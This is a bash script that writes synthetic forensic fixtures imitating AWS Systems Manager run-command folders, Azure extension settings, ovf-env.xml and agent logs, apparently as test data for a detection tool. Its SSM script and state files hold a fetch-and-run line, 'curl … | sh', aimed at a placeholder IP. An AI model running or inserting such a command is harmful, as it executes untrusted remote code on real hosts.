#!/bin/bash
# Files that only a cloud-delivered command creates, written in the formats the vendors document
# (AWS Systems Manager agent "orchestration" tree, WALinuxAgent extension settings and log lines,
# Azure ovf-env.xml). Example data only. See docs/LIMITATIONS.md, "Synthetic only".
set -euo pipefail
cd "$(dirname "$0")/synthetic"
I=i-0123456789abcdef0
C=2c9e8f3a-1b2d-4c5e-9f60-aabbccddeeff
mkdir -p var/lib/amazon/ssm/$I/document/orchestration/$C/awsrunShellScript/0.awsrunShellScript \
         var/lib/amazon/ssm/$I/document/state/completed \
         var/lib/amazon/ssm/$I/session/orchestration/alice-0abc123def456ghi7/Standard_Stream
printf '#!/bin/sh\ncurl -s http://203.0.113.9/x.sh | sh\nid\n' > var/lib/amazon/ssm/$I/document/orchestration/$C/awsrunShellScript/0.awsrunShellScript/_script.sh
printf 'uid=0(root) gid=0(root) groups=0(root)\n' > var/lib/amazon/ssm/$I/document/orchestration/$C/awsrunShellScript/0.awsrunShellScript/stdout
printf 'curl: (7) Failed to connect\n' > var/lib/amazon/ssm/$I/document/orchestration/$C/awsrunShellScript/0.awsrunShellScript/stderr
cat > var/lib/amazon/ssm/$I/document/state/completed/$C <<Y
{"DocumentInformation":{"CommandID":"$C","DocumentName":"AWS-RunShellScript","DocumentVersion":"\$DEFAULT","CreatedDate":"2026-11-12T09:30:15.123Z","DocumentStatus":"Success","RunCount":1},"InstancePluginsInformation":[{"Name":"aws:runShellScript","Configuration":{"Properties":{"runCommand":["curl -s http://203.0.113.9/x.sh | sh","id"]}}}]}
Y
printf 'alice@host:~$ id\r\nuid=1001(alice)\r\n' > var/lib/amazon/ssm/$I/session/orchestration/alice-0abc123def456ghi7/Standard_Stream/stdout
mkdir -p var/lib/waagent/Microsoft.Azure.Extensions.CustomScript-2.1.10/config var/lib/waagent/custom-script/download/0 var/lib/waagent
cat > var/lib/waagent/Microsoft.Azure.Extensions.CustomScript-2.1.10/config/3.settings <<Y
{"runtimeSettings":[{"handlerSettings":{"publicSettings":{"commandToExecute":"sh install.sh --token example","fileUris":["https://example.blob.core.windows.net/s/install.sh"]},"protectedSettings":"MIIBPLANTED-AZURE-PROTECTED-0027","protectedSettingsCertThumbprint":"0123456789ABCDEF0123456789ABCDEF01234567"}}]}
Y
printf '#!/bin/sh\necho installing\n' > var/lib/waagent/custom-script/download/0/install.sh
printf 'installing\n' > var/lib/waagent/custom-script/download/0/stdout
cat > var/lib/waagent/ovf-env.xml <<Y
<?xml version="1.0" encoding="utf-8"?>
<ns0:Environment xmlns:ns0="http://schemas.dmtf.org/ovf/environment/1" xmlns:ns1="http://schemas.microsoft.com/windowsazure">
  <ns1:ProvisioningSection>
    <ns1:Version>1.0</ns1:Version>
    <ns1:LinuxProvisioningConfigurationSet>
      <ns1:ConfigurationSetType>LinuxProvisioningConfiguration</ns1:ConfigurationSetType>
      <ns1:HostName>vm-example-01</ns1:HostName>
      <ns1:UserName>azureuser</ns1:UserName>
      <ns1:UserPassword>PLANTED-AZURE-PASSWORD-HASH-0028</ns1:UserPassword>
      <ns1:DisableSshPasswordAuthentication>true</ns1:DisableSshPasswordAuthentication>
      <ns1:CustomData>IyEvYmluL3NoCmVjaG8gaGk=</ns1:CustomData>
    </ns1:LinuxProvisioningConfigurationSet>
  </ns1:ProvisioningSection>
</ns0:Environment>
Y
cat > waagent-extension.log <<Y
2026-11-12T09:31:00.000001Z INFO ExtHandler ExtHandler [Microsoft.Azure.Extensions.CustomScript-2.1.10] Target handler state: enabled [incarnation_3]
2026-11-12T09:31:00.000002Z INFO ExtHandler ExtHandler [Microsoft.Azure.Extensions.CustomScript-2.1.10] Executing command: bin/custom-script-shim enable
2026-11-12T09:31:01.000003Z WARNING ExtHandler ExtHandler Traceback (most recent call last):
  File "/usr/lib/python3/dist-packages/azurelinuxagent/ga/exthandlers.py", line 1
2026-11-12T09:31:02.000004Z INFO MonitorHandler ExtHandler Heartbeat
Y
